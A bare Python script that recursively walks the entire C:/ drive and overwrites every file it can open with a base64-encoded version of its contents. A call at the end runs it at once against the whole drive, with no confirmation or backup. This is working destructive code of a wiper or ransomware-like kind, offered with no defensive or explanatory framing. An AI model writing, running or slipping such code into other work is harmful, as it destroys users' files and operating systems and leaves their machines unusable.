import sys
import base64
import os

def encode_and_replace_files(startpath):
    # get all files in dir recursively (includes files in directories)
    files = [os.path.join(directory_path, file) for directory_path, directory_name, file_name in os.walk(startpath) for file in file_name] # this will be slow, what did u expect
    for file in files:
        try:
            with open(file, 'rb+') as file:
                content = file.read()
                # Encode the content using Base64
                encoded_bytes = base64.b64encode(content)
                encoded_string = encoded_bytes.decode('utf-8')
                file.seek(0)
                file.truncate()
                file.write(encoded_string.encode('utf-8'))
        except Exception as e:
            print(f"Error processing {startpath}: {e}")
encode_and_replace_files("C:/")
